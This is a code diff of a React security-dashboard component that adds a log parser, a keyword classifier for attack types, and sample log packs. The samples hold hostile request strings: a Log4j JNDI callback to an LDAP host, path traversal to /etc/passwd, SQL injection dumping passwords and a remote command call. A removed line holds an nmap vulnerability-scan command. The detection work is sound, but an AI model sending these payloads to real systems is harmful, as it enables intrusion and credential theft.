@@ -1,8 +1,8 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { 
   Globe2, ShieldAlert, AlertTriangle, ShieldCheck, 
   ExternalLink, Search, Crosshair, ChevronRight, Zap, RefreshCw, X, Radio, Layers,
-  Activity, Shield, Terminal, Check, Bot
+  Activity, Shield, Terminal, Check, Bot, FileCode, Upload, ArrowRight, Play
 } from 'lucide-react';
 import { Globe3D } from '../globe/Globe3D';
 import { GlobalCyberAttack, IdsTrafficEvent } from '../../types';
@@ -14,6 +14,33 @@ interface SocViewProps {
   activeSubSection?: string;
   onOpenAiSwarm?: (initialPrompt?: string) => void;
 }
+
+interface ParsedLogEvent {
+  id: string;
+  timestamp: string;
+  sourceIp: string;
+  httpMethod: string;
+  uri: string;
+  statusCode: number;
+  attackType: string;
+  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
+  mitreTechnique: string;
+}
+
+const SAMPLE_LOG_PACKS = {
+  log4j: `# Apache Web Server Incident Log - Active JNDI & Traversal Probes
+198.51.100.42 - - [11/Sep/2026:14:23:10 +0000] "GET /api/v1/search?q=\${jndi:ldap://198.51.100.42:1389/Exploit} HTTP/1.1" 400 324 "-" "Mozilla/5.0"
+185.220.101.5 - - [11/Sep/2026:14:23:12 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.28.1"
+203.0.113.88 - - [11/Sep/2026:14:23:15 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 182 "-" "sqlmap/1.6"
+45.33.32.156 - - [11/Sep/2026:14:23:19 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 168 "-" "Mozilla/5.0"
+91.240.118.242 - - [11/Sep/2026:14:23:22 +0000] "GET /cgi-bin/%%35%63%%35%63/winnt/system32/cmd.exe?/c+dir HTTP/1.1" 400 284`,
+
+  sqli: `# Perimeter Gateway Honeypot - SQLi & Deserialization Surge
+194.26.29.112 - - [11/Sep/2026:14:30:01 +0000] "GET /items?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 1842
+141.98.11.89 - - [11/Sep/2026:14:30:05 +0000] "GET /.env HTTP/1.1" 404 153
+185.191.171.12 - - [11/Sep/2026:14:30:11 +0000] "POST /graphql HTTP/1.1" 500 128 "mutation { systemExec(cmd: 'whoami') }"
+104.244.42.1 - - [11/Sep/2026:14:30:18 +0000] "POST /wp-login.php HTTP/1.1" 200 4521 "-" "Go-http-client/1.1"`
+};
 
 export const SocView: React.FC<SocViewProps> = ({ 
   activeSubSection = 'globe',
@@ -30,38 +57,35 @@ export const SocView: React.FC<SocViewProps> = ({
   const [selectedAttack, setSelectedAttack] = useState<GlobalCyberAttack | null>(null);
   const [selectedCountry, setSelectedCountry] = useState<CountryThreatNode | null>(null);
   const [focusCoords, setFocusCoords] = useState<[number, number] | null>(null);
-  const [rightDeckTab, setRightDeckTab] = useState<'stream' | 'countries' | 'ids'>('stream');
+  const [rightDeckTab, setRightDeckTab] = useState<'stream' | 'countries' | 'ids' | 'parser'>('stream');
   const [filterSeverity, setFilterSeverity] = useState<'ALL' | 'CRITICAL' | 'HIGH'>('ALL');
   const [searchQuery, setSearchQuery] = useState('');
   const [triageModalOpen, setTriageModalOpen] = useState(false);
 
   // Live IDS Sensor State
   const [idsEvents, setIdsEvents] = useState<IdsTrafficEvent[]>([]);
-  const [idsStats, setIdsStats] = useState({
-    totalEvents: 14820,
-    activeCritical: 1,
-    activeHigh: 4,
-    threatsBlocked: 14872,
-    securityScore: 98,
-  });
   const [activeAlertBanner, setActiveAlertBanner] = useState<IdsTrafficEvent | null>(null);
   const [blockedIps, setBlockedIps] = useState<Set<string>>(new Set());
 
-  // Sync with NavRail activeSubSection if changed
+  // Log Parser State
+  const [rawLogInput, setRawLogInput] = useState(SAMPLE_LOG_PACKS.log4j);
+  const [parsedEvents, setParsedEvents] = useState<ParsedLogEvent[]>([]);
+  const [isParsingLogs, setIsParsingLogs] = useState(false);
+
+  // Sync with NavRail activeSubSection
   useEffect(() => {
     if (activeSubSection === 'stream') setRightDeckTab('stream');
-    else if (activeSubSection === 'countries' || activeSubSection === 'aerospace') setRightDeckTab('countries');
+    else if (activeSubSection === 'countries') setRightDeckTab('countries');
     else if (activeSubSection === 'ids') setRightDeckTab('ids');
   }, [activeSubSection]);
 
-  // Poll IDS Events from /api/ids every 5 seconds
+  // Poll IDS Events from /api/ids
   useEffect(() => {
     const fetchIds = async () => {
       try {
         const res = await apiService.getIdsEvents();
         if (res.events && res.events.length > 0) {
           setIdsEvents(res.events);
-          if (res.stats) setIdsStats(res.stats);
           const latest = res.events[0];
           if (latest && (latest.severity === 'Critical' || latest.signature.includes('Nmap'))) {
             setActiveAlertBanner(latest);
@@ -72,7 +96,7 @@ export const SocView: React.FC<SocViewProps> = ({
       }
     };
     fetchIds();
-    const interval = setInterval(fetchIds, 5000);
+    const interval = setInterval(fetchIds, 6000);
     return () => clearInterval(interval);
   }, []);
 
@@ -83,40 +107,6 @@ export const SocView: React.FC<SocViewProps> = ({
       if (activeAlertBanner?.sourceIp === ip) setActiveAlertBanner(null);
     }, 1500);
   };
-
-  const handleTriggerSimulatedKaliProbe = async () => {
-    try {
-      const res = await apiService.triggerIdsProbe({
-        probeType: 'nmap-nse',
-        endpoint: '/api/v1/auth/internal-debug',
-        payload: 'nmap -sV -p 443 --script http-vuln-cve2024-3400',
-      });
-      if (res.detectedEvent) {
-        setIdsEvents((prev) => [res.detectedEvent, ...prev]);
-        setActiveAlertBanner(res.detectedEvent);
-        setRightDeckTab('ids');
-      }
-    } catch (e) {
-      console.warn('Kali probe trigger failed:', e);
-    }
-  };
-
-
-  // Live attack injection timer simulating active real-world threat telemetry
-  useEffect(() => {
-    const interval = setInterval(() => {
-      const randomSeed = GLOBAL_THREAT_SEEDS[Math.floor(Math.random() * GLOBAL_THREAT_SEEDS.length)];
-      const newAttack: GlobalCyberAttack = {
-        ...randomSeed,
-        id: `atk-${Date.now()}-${Math.random().toString(36).substring(7)}`,
-        timestamp: new Date().toLocaleTimeString(),
-      };
-
-      setAttacks((prev) => [newAttack, ...prev.slice(0, 39)]);
-    }, 4500);
-
-    return () => clearInterval(interval);
-  }, []);
 
   const handleSelectAttack = (atk: GlobalCyberAttack) => {
     setSelectedAttack(atk);
@@ -130,6 +120,95 @@ export const SocView: React.FC<SocViewProps> = ({
     setFocusCoords(ct.centerCoords);
   };
 
+  // Parser Engine: Parses raw logs into structured CTI events
+  const handleParseLogs = () => {
+    setIsParsingLogs(true);
+    const lines = rawLogInput.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+    const results: ParsedLogEvent[] = [];
+
+    lines.forEach((line, idx) => {
+      // Extract IP address
+      const ipMatch = line.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+      const ip = ipMatch ? ipMatch[1] : `192.0.2.${idx + 10}`;
+
+      // Extract HTTP method & URI
+      const reqMatch = line.match(/"(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+([^"\s]+)\s+HTTP\/[0-9.]+"/i);
+      const method = reqMatch ? reqMatch[1] : 'GET';
+      const uri = reqMatch ? reqMatch[2] : '/';
+
+      // Extract Status Code
+      const statusMatch = line.match(/"\s+(\d{3})\s+/);
+      const status = statusMatch ? parseInt(statusMatch[1], 10) : 200;
+
+      // Classify Attack Pattern
+      let attackType = 'Normal Web Request';
+      let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'LOW';
+      let mitre = 'T1071: Standard Application Layer Protocol';
+
+      const lower = line.toLowerCase();
+      if (lower.includes('jndi') || lower.includes('ldap://') || lower.includes('cve-2021-44228')) {
+        attackType = 'Log4j JNDI Remote Code Execution';
+        severity = 'CRITICAL';
+        mitre = 'T1190: Exploit Public-Facing Application';
+      } else if (lower.includes('..') || lower.includes('/etc/passwd') || lower.includes('system32')) {
+        attackType = 'Directory Path Traversal';
+        severity = 'HIGH';
+        mitre = 'T1083: File and Directory Discovery';
+      } else if (lower.includes('union') || lower.includes('select') || lower.includes('--') || lower.includes('sqlmap')) {
+        attackType = 'SQL Injection (Blind / Union-Based)';
+        severity = 'HIGH';
+        mitre = 'T1190: Exploit Public-Facing Application';
+      } else if (lower.includes('wp-login') || lower.includes('/login') || lower.includes('401')) {
+        attackType = 'Credential Brute-Force';
+        severity = 'MEDIUM';
+        mitre = 'T1110: Brute Force';
+      } else if (lower.includes('.env') || lower.includes('setup.php')) {
+        attackType = 'Environment Reconnaissance Probe';
+        severity = 'MEDIUM';
+        mitre = 'T1595: Active Scanning';
+      }
+
+      results.push({
+        id: `parsed-${Date.now()}-${idx}`,
+        timestamp: new Date().toLocaleTimeString(),
+        sourceIp: ip,
+        httpMethod: method,
+        uri,
+        statusCode: status,
+        attackType,
+        severity,
+        mitreTechnique: mitre,
+      });
+    });
+
+    setParsedEvents(results);
+    setIsParsingLogs(false);
+
+    // Also inject high-severity parsed events into the active attacks map
+    const newAttacks: GlobalCyberAttack[] = results
+      .filter(r => r.severity === 'CRITICAL' || r.severity === 'HIGH')
+      .map((r, i) => ({
+        id: `ingest-${r.id}`,
+        timestamp: r.timestamp,
+        sourceCountry: 'External Adversary',
+        sourceCity: r.sourceIp,
+        sourceFlag: '🏴‍☠️',
+        sourceCoords: [20 + i * 5, -10 + i * 15] as [number, number],
+        targetCountry: 'Protected Infrastructure',
+        targetCity: 'Gateway Perimeter',
+        targetFlag: '🛡️',
+        targetCoords: [48.8566, 2.3522],
+        vector: `${r.attackType} (${r.httpMethod} ${r.uri})`,
+        threatActor: `APT-ACTOR-${r.sourceIp.split('.')[0]}`,
+        severity: r.severity as 'CRITICAL' | 'HIGH',
+        status: 'DETECTED',
+      }));
+
+    if (newAttacks.length > 0) {
+      setAttacks(prev => [...newAttacks, ...prev.slice(0, 30)]);
+    }
+  };
+
   const filteredAttacks = attacks.filter((atk) => {
     const matchesSeverity = filterSeverity === 'ALL' || atk.severity === filterSeverity;
     const matchesSearch =
@@ -137,8 +216,7 @@ export const SocView: React.FC<SocViewProps> = ({
       atk.threatActor.toLowerCase().includes(searchQuery.toLowerCase()) ||
       atk.vector.toLowerCase().includes(searchQuery.toLowerCase()) ||
       atk.targetCity?.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      atk.sourceCity?.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      (atk.cve && atk.cve.toLowerCase().includes(searchQuery.toLowerCase()));
+      atk.sourceCity?.toLowerCase().includes(searchQuery.toLowerCase());
     return matchesSeverity && matchesSearch;
   });
 
@@ -161,378 +239,291 @@ export const SocView: React.FC<SocViewProps> = ({
       e.signature.toLowerCase().includes(q) ||
       e.sourceIp.toLowerCase().includes(q) ||
       e.targetEndpoint.toLowerCase().includes(q) ||
-      e.country.toLowerCase().includes(q) ||
-      e.attackPhase.toLowerCase().includes(q)
+      e.country.toLowerCase().includes(q)
     );
   });
 
   return (
-    <div className="flex-1 w-full h-full flex flex-col gap-3 overflow-hidden font-mono">
-      {/* Main Grid: Left Stage (Globe) + Right Deck (Attack Stream / Country Rankings) */}
-      <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12 gap-3.5 overflow-hidden">
-        {/* Left Stage: 3D Living Globe (~65% width) */}
-        <div className="lg:col-span-8 flex flex-col h-full rounded-2xl bg-[#060b14]/90 border border-cyan-500/20 overflow-hidden relative shadow-2xl">
-          <div className="flex-1 w-full h-full relative">
-            {/* Urgent IDS Intercept Alert Banner */}
-            {activeAlertBanner && (
-              <div className="absolute top-3 left-3 right-3 z-30 p-3 rounded-2xl bg-red-950/95 border border-red-500/80 shadow-[0_0_30px_rgba(239,68,68,0.5)] backdrop-blur-xl flex items-center justify-between gap-3 animate-in fade-in slide-in-from-top-2">
-                <div className="flex items-center gap-2.5">
-                  <div className="w-8 h-8 rounded-xl bg-red-600 flex items-center justify-center text-white font-bold shrink-0 shadow-[0_0_15px_rgba(239,68,68,0.6)]">
-                    <ShieldAlert className="w-4 h-4" />
-                  </div>
-                  <div>
-                    <div className="flex items-center gap-2 text-xs font-black text-red-200 uppercase tracking-wider">
-                      <span>LIVE INTRUSION DETECTED // IDS SENSOR INTERCEPT</span>
-                      <span className="px-1.5 py-0.5 rounded bg-red-800/80 text-white text-[9px] font-mono">
-                        {activeAlertBanner.signature}
-                      </span>
-                    </div>
-                    <p className="text-[11px] text-red-300 font-mono mt-0.5">
-                      Source IP: <span className="font-bold text-white">{activeAlertBanner.sourceIp}</span> ({activeAlertBanner.country}) | Target: <span className="text-white">{activeAlertBanner.targetEndpoint}</span> (Port {activeAlertBanner.targetPort})
-                    </p>
-                  </div>
-                </div>
-                <div className="flex items-center gap-2 shrink-0">
-                  <button
-                    onClick={() => handleBlockIp(activeAlertBanner.sourceIp)}
-                    disabled={blockedIps.has(activeAlertBanner.sourceIp)}
-                    className="px-3 py-1.5 rounded-xl bg-red-600 hover:bg-red-500 text-white text-xs font-extrabold flex items-center gap-1 transition-all shadow-lg cursor-pointer disabled:opacity-50"
-                  >
-                    <Zap className="w-3.5 h-3.5" />
-                    <span>{blockedIps.has(activeAlertBanner.sourceIp) ? 'IP Blocked (DROP)' : 'Block IP (iptables DROP)'}</span>
-                  </button>
-                  <button
-                    onClick={() => setActiveAlertBanner(null)}
-                    className="text-red-300 hover:text-white p-1 cursor-pointer"
-                  >
-                    <X className="w-4 h-4" />
-                  </button>
-                </div>
-              </div>
-            )}
-
-            <Globe3D
-              attacks={attacks}
-              selectedAttack={selectedAttack}
-              onSelectAttack={handleSelectAttack}
-              focusCoords={focusCoords}
-              onSelectCountry={handleSelectCountry}
-            />
-
-            {/* Selected Attack Target Overlay */}
-            {selectedAttack && (
-              <div className="absolute top-14 right-3 max-w-sm p-3 rounded-xl bg-[#0a101d]/95 border border-cyan-400/50 shadow-[0_0_20px_rgba(0,240,255,0.25)] backdrop-blur-xl animate-in fade-in slide-in-from-top-2 z-20">
-                <div className="flex items-center justify-between gap-2 pb-1.5 border-b border-cyan-500/20">
-                  <div className="flex items-center gap-1.5 text-xs font-bold text-white">
-                    <span className="text-red-400">TARGET LOCKED:</span>
-                    <span>{selectedAttack.targetCity}, {selectedAttack.targetCountry}</span>
-                    <span>{selectedAttack.targetFlag}</span>
-                  </div>
-                  <button
-                    onClick={() => setSelectedAttack(null)}
-                    className="text-slate-400 hover:text-white"
-                  >
-                    <X className="w-3.5 h-3.5" />
-                  </button>
-                </div>
-
-                <div className="mt-2 text-[11px] space-y-1 text-slate-300">
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Threat Actor:</span>
-                    <span className="text-red-400 font-bold">{selectedAttack.threatActor}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Attack Vector:</span>
-                    <span className="text-cyan-300 truncate max-w-[180px]">{selectedAttack.vector}</span>
-                  </div>
-                  {selectedAttack.cve && (
-                    <div className="flex justify-between">
-                      <span className="text-slate-500">Exploited CVE:</span>
-                      <span className="text-purple-400 font-bold">{selectedAttack.cve}</span>
-                    </div>
-                  )}
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Mitigation:</span>
-                    <span className="text-emerald-400 font-bold">{selectedAttack.status}</span>
-                  </div>
-                </div>
-
-                <button
-                  onClick={() => setTriageModalOpen(true)}
-                  className="mt-2.5 w-full py-1.5 rounded-lg bg-gradient-to-r from-cyan-500/30 to-blue-600/30 border border-cyan-400/50 hover:bg-cyan-500/40 text-cyan-300 text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer"
-                >
-                  <Zap className="w-3.5 h-3.5 text-cyan-400" />
-                  <span>Execute Triage Playbook</span>
-                </button>
-              </div>
-            )}
-
-            {/* Selected Country Hotspot Overlay */}
-            {selectedCountry && (
-              <div className="absolute top-14 right-3 max-w-sm p-3.5 rounded-xl bg-[#0a101d]/95 border border-yellow-500/50 shadow-[0_0_20px_rgba(245,158,11,0.25)] backdrop-blur-xl animate-in fade-in slide-in-from-top-2 z-20">
-                <div className="flex items-center justify-between gap-2 pb-1.5 border-b border-yellow-500/20">
-                  <div className="flex items-center gap-2 text-xs font-bold text-white">
-                    <span className="text-yellow-400">HOTSPOT CLUSTER:</span>
-                    <span>{selectedCountry.flag} {selectedCountry.country}</span>
-                  </div>
-                  <button
-                    onClick={() => setSelectedCountry(null)}
-                    className="text-slate-400 hover:text-white"
-                  >
-                    <X className="w-3.5 h-3.5" />
-                  </button>
-                </div>
-
-                <div className="mt-2 text-[11px] space-y-1.5 text-slate-300">
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Total Attacks:</span>
-                    <span className="text-yellow-400 font-bold">{selectedCountry.incidentCount.toLocaleString()} Ingress</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Primary Vectors:</span>
-                    <span className="text-cyan-300 truncate max-w-[180px]">{selectedCountry.primaryVector}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Active Actors:</span>
-                    <span className="text-red-400 font-bold">{selectedCountry.topActors.join(', ')}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Attacked Ports:</span>
-                    <span className="text-slate-200 font-mono">{selectedCountry.topPorts.join(', ')}</span>
-                  </div>
-                </div>
-
-                <div className="mt-2.5 p-2 rounded-lg bg-yellow-950/30 border border-yellow-500/20 text-[10px] text-yellow-300">
-                  Showing {selectedCountry.dots.length} geographically distributed incident nodes inside {selectedCountry.country}.
-                </div>
-              </div>
-            )}
+    <div className="flex-1 w-full h-full flex flex-col overflow-hidden font-sans text-slate-200">
+      {/* 1. Header Status Bar */}
+      <div className="px-4 py-2 bg-[#090e18] border-b border-slate-800/80 flex items-center justify-between gap-3 shrink-0">
+        <div className="flex items-center gap-5 text-xs">
+          <div className="flex items-center gap-2">
+            <span className="w-2 h-2 rounded-full bg-emerald-400" />
+            <span className="font-mono text-slate-400">TELEMETRY GRID:</span>
+            <span className="font-semibold text-white">NOMINAL</span>
           </div>
+
+          <div className="h-4 w-[1px] bg-slate-800" />
+
+          <div className="flex items-center gap-1.5 font-mono text-slate-400">
+            <span>ACTIVE INCIDENTS:</span>
+            <span className="font-bold text-white">{attacks.length}</span>
+          </div>
+
+          <div className="h-4 w-[1px] bg-slate-800 hidden sm:block" />
+
+          <div className="flex items-center gap-1.5 font-mono text-slate-400 hidden sm:flex">
+            <span>IDS SENSORS:</span>
+            <span className="font-bold text-emerald-400">ONLINE ({idsEvents.length})</span>
+          </div>
+
+          {blockedIps.size > 0 && (
+            <div className="flex items-center gap-1.5 font-mono text-red-400">
+              <span>FIREWALL DROPS:</span>
+              <span className="font-bold">{blockedIps.size}</span>
+            </div>
+          )}
         </div>
 
-        {/* Right Stacked Deck: Live Attacks Stream or Country Rankings (~35% width) */}
-        <div className="lg:col-span-4 flex flex-col h-full rounded-2xl bg-[#080e1a]/95 border border-cyan-500/20 shadow-2xl backdrop-blur-xl overflow-hidden">
+        {/* Global AI Swarm Triage Trigger */}
+        {onOpenAiSwarm && (
+          <button
+            onClick={() => onOpenAiSwarm('Execute deep triage across active network telemetry anomalies and recommend firewall containment policy.')}
+            className="flex items-center gap-1.5 px-2.5 py-1 rounded bg-blue-950/70 border border-blue-800/60 hover:border-blue-700 text-blue-300 text-xs font-medium transition-colors cursor-pointer"
+          >
+            <Bot className="w-3.5 h-3.5 text-blue-400" />
+            <span>AI Triage Swarm</span>
+          </button>
+        )}
+      </div>
+
+      {/* 2. Main Stage Grid: 3D Living Globe (Left) + High-Density Telemetry Deck (Right) */}
+      <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12 overflow-hidden">
+        {/* Left Pane: 3D Globe */}
+        <div className="lg:col-span-7 xl:col-span-8 flex flex-col h-full bg-[#070b13] relative border-r border-slate-800/80 overflow-hidden">
+          {/* Urgent Intrusion Alert Banner */}
+          {activeAlertBanner && (
+            <div className="absolute top-3 left-3 right-3 z-30 p-3 rounded-lg bg-red-950/90 border border-red-800/80 shadow-lg backdrop-blur-md flex items-center justify-between gap-3 animate-in fade-in">
+              <div className="flex items-center gap-2.5 min-w-0">
+                <div className="w-7 h-7 rounded bg-red-600 flex items-center justify-center text-white shrink-0">
+                  <ShieldAlert className="w-4 h-4" />
+                </div>
+                <div className="min-w-0">
+                  <div className="flex items-center gap-2 text-xs font-semibold text-red-200">
+                    <span>INTRUSION INTERCEPT:</span>
+                    <span className="font-mono text-white truncate">{activeAlertBanner.signature}</span>
+                  </div>
+                  <div className="text-[11px] text-red-300/80 font-mono mt-0.5">
+                    Source: <span className="text-white font-bold">{activeAlertBanner.sourceIp}</span> ({activeAlertBanner.country}) ⟶ Port {activeAlertBanner.targetPort}
+                  </div>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-2 shrink-0">
+                <button
+                  onClick={() => handleBlockIp(activeAlertBanner.sourceIp)}
+                  disabled={blockedIps.has(activeAlertBanner.sourceIp)}
+                  className="px-2.5 py-1 rounded bg-red-600 hover:bg-red-500 text-white text-xs font-medium flex items-center gap-1 transition-colors cursor-pointer disabled:opacity-50"
+                >
+                  <Zap className="w-3 h-3" />
+                  <span>{blockedIps.has(activeAlertBanner.sourceIp) ? 'Dropped' : 'Block IP (iptables)'}</span>
+                </button>
+                <button
+                  onClick={() => setActiveAlertBanner(null)}
+                  className="text-red-400 hover:text-white p-1"
+                >
+                  <X className="w-3.5 h-3.5" />
+                </button>
+              </div>
+            </div>
+          )}
+
+          <Globe3D
+            attacks={attacks}
+            selectedAttack={selectedAttack}
+            onSelectAttack={handleSelectAttack}
+            focusCoords={focusCoords}
+            onSelectCountry={handleSelectCountry}
+          />
+
+          {/* Selected Attack Inspector Pill */}
+          {selectedAttack && (
+            <div className="absolute bottom-3 left-3 right-3 max-w-lg p-3 rounded-lg bg-[#0a101d]/95 border border-slate-700 shadow-xl backdrop-blur-md z-20 flex items-center justify-between gap-3 text-xs">
+              <div>
+                <div className="flex items-center gap-2 text-slate-300 font-medium">
+                  <span className="text-red-400 font-bold uppercase">{selectedAttack.severity}:</span>
+                  <span>{selectedAttack.threatActor}</span>
+                  <span className="text-slate-500">⟶</span>
+                  <span>{selectedAttack.targetCity}, {selectedAttack.targetCountry}</span>
+                </div>
+                <div className="text-[11px] text-slate-400 mt-0.5 font-mono truncate max-w-sm">
+                  {selectedAttack.vector}
+                </div>
+              </div>
+              <button
+                onClick={() => setSelectedAttack(null)}
+                className="text-slate-400 hover:text-white p-1"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+          )}
+        </div>
+
+        {/* Right Pane: Telemetry Tabs & Log Ingestion Engine */}
+        <div className="lg:col-span-5 xl:col-span-4 flex flex-col h-full bg-[#0b101b] overflow-hidden">
           {/* Deck Header Tabs */}
-          <div className="p-2 border-b border-cyan-500/20 bg-[#0a1222] flex items-center justify-between">
-            <div className="flex items-center gap-1.5">
+          <div className="p-2 border-b border-slate-800 bg-[#090e18] flex items-center justify-between text-xs">
+            <div className="flex items-center gap-1">
               <button
                 onClick={() => setRightDeckTab('stream')}
-                className={`px-3 py-1 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
+                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                   rightDeckTab === 'stream'
-                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-400/50'
+                    ? 'bg-slate-800 text-white font-semibold'
                     : 'text-slate-400 hover:text-slate-200'
                 }`}
               >
-                <ShieldAlert className="w-3.5 h-3.5" />
-                <span>Live Incidents</span>
-              </button>
-
-              <button
-                onClick={() => setRightDeckTab('countries')}
-                className={`px-3 py-1 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
-                  rightDeckTab === 'countries'
-                    ? 'bg-yellow-500/20 text-yellow-300 border border-yellow-400/50'
-                    : 'text-slate-400 hover:text-slate-200'
-                }`}
-              >
-                <Radio className="w-3.5 h-3.5" />
-                <span>Countries ({REAL_COUNTRY_THREATS.length})</span>
+                Incidents ({attacks.length})
               </button>
 
               <button
                 onClick={() => setRightDeckTab('ids')}
-                className={`px-3 py-1 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
+                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                   rightDeckTab === 'ids'
-                    ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-400/50 shadow-[0_0_10px_rgba(16,185,129,0.3)]'
+                    ? 'bg-slate-800 text-white font-semibold'
                     : 'text-slate-400 hover:text-slate-200'
                 }`}
               >
-                <Activity className="w-3.5 h-3.5" />
-                <span>IDS Sensor ({idsEvents.length})</span>
+                IDS Alerts ({idsEvents.length})
               </button>
-            </div>
 
-            {rightDeckTab === 'stream' && (
               <button
-                onClick={() => setFilterSeverity(filterSeverity === 'ALL' ? 'CRITICAL' : 'ALL')}
-                className={`px-2 py-0.5 rounded text-[10px] font-bold border transition-colors cursor-pointer ${
-                  filterSeverity === 'CRITICAL'
-                    ? 'bg-red-950/60 border-red-500/50 text-red-300'
-                    : 'bg-slate-800/60 border-slate-700 text-slate-400 hover:text-slate-200'
+                onClick={() => setRightDeckTab('countries')}
+                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
+                  rightDeckTab === 'countries'
+                    ? 'bg-slate-800 text-white font-semibold'
+                    : 'text-slate-400 hover:text-slate-200'
                 }`}
               >
-                {filterSeverity === 'CRITICAL' ? 'CRIT ONLY' : 'ALL SEV'}
+                Countries ({REAL_COUNTRY_THREATS.length})
               </button>
+
+              <button
+                onClick={() => setRightDeckTab('parser')}
+                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer flex items-center gap-1 ${
+                  rightDeckTab === 'parser'
+                    ? 'bg-blue-600/20 text-blue-300 border border-blue-500/50'
+                    : 'text-slate-400 hover:text-slate-200'
+                }`}
+              >
+                <FileCode className="w-3 h-3 text-blue-400" />
+                <span>Log Parser</span>
+              </button>
+            </div>
+          </div>
+
+          {/* Search bar inside deck (hidden in parser mode) */}
+          {rightDeckTab !== 'parser' && (
+            <div className="p-2 border-b border-slate-800 bg-[#080d17]">
+              <div className="relative">
+                <Search className="w-3.5 h-3.5 text-slate-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
+                <input
+                  type="text"
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  placeholder="Filter by actor, IP, vector, or country..."
+                  className="w-full pl-8 pr-3 py-1 text-xs bg-slate-900 border border-slate-800 rounded text-white placeholder-slate-500 focus:outline-none focus:border-blue-500"
+                />
+              </div>
+            </div>
+          )}
+
+          {/* Deck Body */}
+          <div className="flex-1 overflow-y-auto p-2.5 space-y-2">
+            {rightDeckTab === 'stream' && (
+              filteredAttacks.length === 0 ? (
+                <div className="p-8 text-center text-xs text-slate-500 border border-dashed border-slate-800 rounded">
+                  No active incidents matching current filter.
+                </div>
+              ) : (
+                filteredAttacks.map((atk) => {
+                  const isSelected = selectedAttack?.id === atk.id;
+                  const isCrit = atk.severity === 'CRITICAL';
+                  const isHigh = atk.severity === 'HIGH';
+
+                  return (
+                    <div
+                      key={atk.id}
+                      onClick={() => handleSelectAttack(atk)}
+                      className={`p-2.5 rounded border transition-all cursor-pointer ${
+                        isSelected
+                          ? 'bg-blue-600/10 border-blue-500 shadow-sm'
+                          : isCrit
+                          ? 'bg-red-950/20 border-red-900/40 hover:border-red-700/60'
+                          : 'bg-[#090e18] border-slate-800 hover:border-slate-700 hover:bg-slate-900/50'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-1">
+                        <div className="flex items-center gap-1.5 min-w-0">
+                          <span className="text-sm">{atk.sourceFlag || '🌐'}</span>
+                          <span className="font-mono text-xs font-semibold text-white truncate">
+                            {atk.threatActor}
+                          </span>
+                        </div>
+                        <div className="flex items-center gap-1.5 shrink-0">
+                          <span
+                            className={`text-[9px] px-1.5 py-0.5 rounded font-mono font-bold uppercase ${
+                              isCrit
+                                ? 'bg-red-900/40 text-red-300 border border-red-800/60'
+                                : isHigh
+                                ? 'bg-amber-900/40 text-amber-300 border border-amber-800/60'
+                                : 'bg-slate-800 text-slate-300 border border-slate-700'
+                            }`}
+                          >
+                            {atk.severity}
+                          </span>
+                          <span className="font-mono text-[10px] text-slate-500">{atk.timestamp}</span>
+                        </div>
+                      </div>
+
+                      <div className="text-[11px] text-slate-300 truncate font-mono">
+                        {atk.vector}
+                      </div>
+
+                      <div className="mt-1.5 pt-1.5 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
+                        <span className="text-slate-400 flex items-center gap-1">
+                          <span className="text-slate-500">Target:</span>
+                          <span className="text-slate-200">{atk.targetCity}, {atk.targetCountry}</span>
+                        </span>
+                        <div className="flex items-center gap-2">
+                          <span className="text-emerald-400 font-mono flex items-center gap-1">
+                            <ShieldCheck className="w-3 h-3 text-emerald-400" />
+                            {atk.status || 'INGRESS_ANALYZED'}
+                          </span>
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              setSelectedAttack(atk);
+                              setTriageModalOpen(true);
+                            }}
+                            className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors"
+                          >
+                            Playbook
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  );
+                })
+              )
             )}
 
             {rightDeckTab === 'ids' && (
-              <button
-                onClick={handleTriggerSimulatedKaliProbe}
-                className="px-2.5 py-1 rounded-lg text-[10px] font-bold border border-cyan-500/40 bg-cyan-500/20 text-cyan-300 hover:bg-cyan-500/30 transition-colors cursor-pointer flex items-center gap-1 shadow-sm"
-                title="Trigger simulated Nmap scan probe to honeypot"
-              >
-                <Zap className="w-3 h-3 text-cyan-400" />
-                <span>Test Kali Probe</span>
